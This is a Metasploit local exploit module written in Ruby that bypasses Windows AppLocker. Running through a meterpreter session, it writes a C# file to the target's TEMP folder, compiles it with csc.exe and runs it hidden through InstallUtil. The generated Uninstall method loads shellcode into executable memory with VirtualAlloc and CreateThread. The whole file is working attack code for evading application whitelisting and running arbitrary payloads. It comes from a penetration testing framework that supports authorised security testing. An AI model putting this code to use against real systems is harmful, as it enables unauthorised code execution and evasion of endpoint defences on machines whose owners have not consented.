##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Exploit::FileDropper
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'AppLocker Execution Prevention Bypass',
      'Description'   => %q{
        This module will generate a .NET service executable on the target and utilise
        InstallUtil to run the payload bypassing the AppLocker protection.

        Currently only the InstallUtil method is provided, but future methods can be
        added easily.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Casey Smith', # Original AppLocker bypass research
          'OJ Reeves'    # MSF module
        ],
      'Platform'      => [ 'win' ],
      'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [ [ 'Windows', {} ] ],
      'DefaultTarget' => 0,
      'DisclosureDate'=> 'Aug 3 2015',
      'References'    =>
        [
          ['URL', 'https://gist.github.com/subTee/fac6af078937dda81e57']
        ]
    ))

    register_options([
      OptEnum.new('TECHNIQUE', [true, 'Technique to use to bypass AppLocker',
                               'INSTALLUTIL', %w(INSTALLUTIL)])])
  end

  # Run Method for when run command is issued
  def exploit
    if datastore['TECHNIQUE'] == 'INSTALLUTIL'
      if payload.arch.first == 'x64' && sysinfo['Architecture'] !~ /64/
        fail_with(Failure::NoTarget, 'The target platform is x86. 64-bit payloads are not supported.')
      end
    end

    # sysinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    if datastore['TECHNIQUE'] == 'INSTALLUTIL'
      execute_installutil
    end
  end

  def execute_installutil
    envs = get_envs('TEMP', 'windir')

    dotnet_path = get_dotnet_path(envs['windir'])
    print_status("Using .NET path #{dotnet_path}")

    cs_path = "#{envs['TEMP']}\\#{Rex::Text.rand_text_alpha(8)}.cs"
    exe_path = "#{envs['TEMP']}\\#{Rex::Text.rand_text_alpha(8)}.exe"

    installutil_path = "#{dotnet_path}\\InstallUtil.exe"

    print_status("Writing payload to #{cs_path}")
    write_file(cs_path, generate_csharp_source)
#    register_files_for_cleanup(cs_path)

    print_status("Compiling payload to #{exe_path}")
    csc_path = "#{dotnet_path}\\csc.exe"
    csc_platform = payload.arch.first == 'x86' ? 'x86' : 'x64'
    vprint_status("Executing: #{csc_path} /target:winexe /nologo /platform:#{csc_platform} /w:0 /out:#{exe_path} #{cs_path}")
    cmd_exec(csc_path, "/target:winexe /nologo /platform:#{csc_platform} /w:0 /out:#{exe_path} #{cs_path}")

    print_status("Executing payload ...")
    vprint_status("Executing: #{installutil_path} /logfile= /LogToConsole=false /U #{exe_path}")
    client.sys.process.execute(installutil_path, "/logfile= /LogToConsole=false /U #{exe_path}", {'Hidden' => true})
    register_files_for_cleanup(exe_path)
  end

  def get_dotnet_path(windir)
    base_path = "#{windir}\\Microsoft.NET\\Framework#{payload.arch.first == 'x86' ? '' : '64'}"
    paths = dir(base_path).select {|p| p[0] == 'v'}
    dotnet_path = nil

    paths.reverse.each do |p|
      path = "#{base_path}\\#{p}"
      if directory?(path) && file?("#{path}\\InstallUtil.exe")
        dotnet_path = path
        break
      end
    end

    unless dotnet_path
      fail_with(Failure::NotVulnerable, '.NET is not present on the target.')
    end

    dotnet_path
  end

  def generate_csharp_source
    sc = payload.encoded.each_byte.map {|b| "0x#{b.to_s(16)}"}.join(',')
    cs = %Q^
using System;

namespace Pop
{
  public class Program { public static void Main() { } }

  [System.ComponentModel.RunInstaller(true)]
  public class Pop : System.Configuration.Install.Installer
  {
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;
    private static UInt32 INFINITE = 0xFFFFFFFF;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, Int32 t, IntPtr p);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr att, UIntPtr st, IntPtr sa, IntPtr p, Int32 c, ref IntPtr id);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);

    public override void Uninstall(System.Collections.IDictionary s)
    {
      byte[] sc = new byte[] {#{sc}};
      IntPtr m = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      System.Runtime.InteropServices.Marshal.Copy(sc, 0, m, sc.Length);
      IntPtr id = IntPtr.Zero;
      WaitForSingleObject(CreateThread(id, UIntPtr.Zero, m, id, 0, ref id), INFINITE);
    }
  }
}
    ^

    cs
  end

end

